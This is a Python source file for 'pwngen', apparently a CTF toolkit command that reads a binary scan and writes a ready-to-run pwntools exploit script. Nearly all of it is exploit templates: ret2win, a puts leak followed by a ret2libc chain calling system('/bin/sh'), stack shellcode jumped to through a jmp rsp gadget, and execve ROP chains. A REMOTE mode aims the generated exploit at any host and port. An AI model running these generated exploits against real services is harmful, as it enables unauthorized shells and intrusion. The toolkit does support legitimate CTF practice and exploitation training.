"""pwngen: turn a pwnscan result into a working exploit script.

    pwngen ./vuln                      # scan, then write exploit.py
    pwngen ./vuln -o solve.py --path ret2win
    pwnscan ./vuln --json > scan.json && pwngen --from-json scan.json
"""

from __future__ import annotations

import json
import os
import sys

from ctftools.core import term
from ctftools.core.binary import load_binary
from ctftools.core.cliutil import (
    add_common_args,
    add_run_args,
    apply_output_flags,
    base_parser,
    fail,
    parse_escapes,
    resolve_binary,
)
from ctftools.core.report import Report

HEADER = '''\
#!/usr/bin/env python3
# Generated by ctftools pwngen.
#   ./{script} LOCAL          run the local binary
#   ./{script} GDB            run under gdb with a breakpoint at the overflow
#   ./{script} REMOTE host port
from pwn import *

exe = context.binary = ELF({binary!r}, checksec=False)
{libc_line}
context.terminal = ["tmux", "splitw", "-h"]

OFFSET = {offset}          # {offset_comment}


def start():
    if args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDBSCRIPT)
    return process([exe.path])


GDBSCRIPT = """
{gdbscript}
continue
"""

io = start()
'''

FOOTER = '''
io.interactive()
'''


def _prefix_block(prefix: bytes) -> str:
    if not prefix:
        return ""
    return (
        "# The vulnerable read is only reached after this interaction.\n"
        f"io.send({prefix!r})\n\n"
    )


def _ret2win(info, offset, target_name, target_addr, prefix) -> str:
    pack = "p64" if info.bits == 64 else "p32"
    body = _prefix_block(prefix)
    if info.pie:
        body += (
            "# PIE is on: leak the image base first and set exe.address to it.\n"
            "# exe.address = leak - exe.sym.some_known_function\n"
        )
        target = f"exe.sym[{target_name!r}]"
    else:
        target = f"exe.sym[{target_name!r}]"
    body += "ret = next(exe.search(asm('ret'), executable=True))  # realigns the stack for movaps\n\n"
    body += "payload = flat({\n"
    body += f"    OFFSET: [ret, {target}],  # {target_name} at {target_addr:#x}\n"
    body += "})\n\n"
    body += "io.sendline(payload)\n"
    return body


def _ret2libc(info, offset, prefix) -> str:
    body = _prefix_block(prefix)
    body += """\
rop = ROP(exe)
rop.raw(rop.find_gadget(["ret"]))          # keep the stack 16 byte aligned
rop.puts(exe.got.puts)                     # leak a libc address
rop.call(exe.sym.main)                     # come back for a second payload

io.sendline(flat({OFFSET: rop.chain()}))

leak = u64(io.recvline().strip().ljust(8, b"\\x00"))
log.success("puts@libc = %#x", leak)

# Identify the libc from this leak, then:
#   libc.address = leak - libc.sym.puts
if libc is None:
    log.warning("set libc = ELF('./libc.so.6') to finish the chain")
    io.interactive()
    sys.exit(0)

libc.address = leak - libc.sym.puts
log.success("libc base = %#x", libc.address)

rop2 = ROP(libc)
rop2.raw(rop2.find_gadget(["ret"]))
rop2.system(next(libc.search(b"/bin/sh\\x00")))

io.sendline(flat({OFFSET: rop2.chain()}))
"""
    return body


def _shellcode(info, offset, prefix) -> str:
    body = _prefix_block(prefix)
    body += """\
shellcode = asm(shellcraft.sh())

# NX is off, so the shellcode runs from the stack.  The jump target is the
# buffer itself: either a jmp rsp gadget with the shellcode after the return
# address, or a leaked stack address.
jmp_rsp = next(exe.search(asm("jmp rsp"), executable=True), None)
if jmp_rsp is None:
    log.warning("no jmp rsp gadget: you need a leaked stack address")
    io.interactive()
    sys.exit(0)

payload = flat({OFFSET: [jmp_rsp, shellcode]})
io.sendline(payload)
"""
    return body


def _execve(info, offset, prefix) -> str:
    body = _prefix_block(prefix)
    body += """\
# Statically linked: build execve("/bin/sh", 0, 0) from the binary's gadgets.
rop = ROP(exe)
binsh = next(exe.search(b"/bin/sh\\x00"), None)
if binsh is None:
    binsh = exe.bss(0x200)
    rop.read(0, binsh, 8)                  # stage the string first

rop.execve(binsh, 0, 0)
io.sendline(flat({OFFSET: rop.chain()}))
"""
    return body


def _generic(info, offset, prefix) -> str:
    body = _prefix_block(prefix)
    pack = "p64" if info.bits == 64 else "p32"
    body += (
        "target = 0xdeadbeef   # the address to return to\n\n"
        f"payload = b'A' * OFFSET + {pack}(target)\n"
        "io.sendline(payload)\n"
    )
    return body


TEMPLATES = {
    "ret2win": _ret2win,
    "ret2plt leak then ret2libc": _ret2libc,
    "Shellcode on the stack": _shellcode,
    "execve syscall chain": _execve,
}


def generate(info, offset: int, path_name: str, win: tuple | None = None,
             prefix: bytes = b"", script_name: str = "exploit.py",
             libc: str | None = None, breakpoint_at: str = "vuln") -> str:
    """Render an exploit script for *path_name*."""
    gdbscript = f"break {breakpoint_at}" if breakpoint_at else "break main"
    libc_line = f"libc = ELF({libc!r}, checksec=False)" if libc else "libc = None   # ELF('./libc.so.6') once you have it"

    header = HEADER.format(
        script=script_name,
        binary=os.path.abspath(info.path),
        offset=offset,
        offset_comment="distance from the input buffer to the saved return address",
        gdbscript=gdbscript,
        libc_line=libc_line,
    )

    if path_name.startswith("ret2win") and win:
        body = _ret2win(info, offset, win[0], win[1], prefix)
    else:
        builder = TEMPLATES.get(path_name, _generic)
        body = builder(info, offset, prefix)

    return header + "\n" + body + FOOTER


def build_parser():
    parser = base_parser("pwngen", "Write an exploit script from a pwnscan result.")
    parser.add_argument("binary", nargs="?", help="the ELF to build an exploit for")
    parser.add_argument("--from-json", help="a pwnscan --json file to read instead of scanning again")
    parser.add_argument("-o", "--output", default="exploit.py", help="where to write the script (default: exploit.py)")
    parser.add_argument("--path", help="which exploit path to template (default: the best one pwnscan found)")
    parser.add_argument("--offset", type=int, help="use this offset instead of discovering one")
    parser.add_argument("--libc", help="path to the challenge libc, wired into the script")
    parser.add_argument("--break-at", default="vuln", help="symbol for the GDB breakpoint (default: vuln)")
    parser.add_argument("--stdout", action="store_true", help="print the script instead of writing a file")
    parser.add_argument("--force", action="store_true", help="overwrite an existing output file")
    add_run_args(parser)
    add_common_args(parser)
    return parser


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)
    apply_output_flags(args)

    scan_data = None
    if args.from_json:
        with open(args.from_json) as fh:
            scan_data = json.load(fh)
        binary_path = scan_data.get("binary", {}).get("path") or args.binary
        if not binary_path:
            fail("the JSON has no binary path; pass the binary too")
    elif args.binary:
        binary_path = args.binary
    else:
        fail("give a binary, or --from-json a pwnscan result")

    path = resolve_binary(binary_path)
    info = load_binary(path)
    prefix = parse_escapes(args.prefix)

    offset = args.offset
    chosen = args.path
    win = None

    if scan_data is None and (offset is None or chosen is None):
        from ctftools.tools.pwnscan import scan

        report = scan(path, prefix=prefix, args=args.argv, timeout=args.timeout,
                      sandbox=not args.no_sandbox, verify=False)
        scan_data = report.as_dict()

    if scan_data:
        offset = offset if offset is not None else (scan_data.get("offset") or {}).get("offset")
        paths = scan_data.get("exploit_paths", [])
        if chosen is None:
            viable = [p for p in paths if p.get("viable")] or paths
            chosen = viable[0]["name"] if viable else "generic"
        wins = scan_data.get("binary", {}).get("win_candidates", [])
        if chosen.startswith("ret2win") and wins:
            name = chosen[len("ret2win ("):-1] if chosen.startswith("ret2win (") else wins[0]["name"]
            match = next((w for w in wins if w["name"] == name), wins[0])
            win = (match["name"], match["address"])

    if offset is None:
        fail("no offset available: run pwnscan first, or pass --offset")

    script = generate(
        info, offset, chosen or "generic", win=win, prefix=prefix,
        script_name=os.path.basename(args.output), libc=args.libc,
        breakpoint_at=args.break_at,
    )

    if args.stdout:
        sys.stdout.write(script)
        return 0

    if os.path.exists(args.output) and not args.force:
        fail(f"{args.output} already exists; pass --force to overwrite")

    with open(args.output, "w") as fh:
        fh.write(script)
    os.chmod(args.output, 0o755)

    report = Report(tool="pwngen", target=path)
    report.data.update({"output": os.path.abspath(args.output), "offset": offset, "path": chosen})
    sec = report.section("Written")
    sec.add(f"  {term.good(args.output)}  ({chosen}, offset {offset})")
    sec.add("")
    sec.add(f"  {term.dim('run it with')} python3 {args.output}")
    report.emit(as_json=args.json)
    return 0


if __name__ == "__main__":
    sys.exit(main())
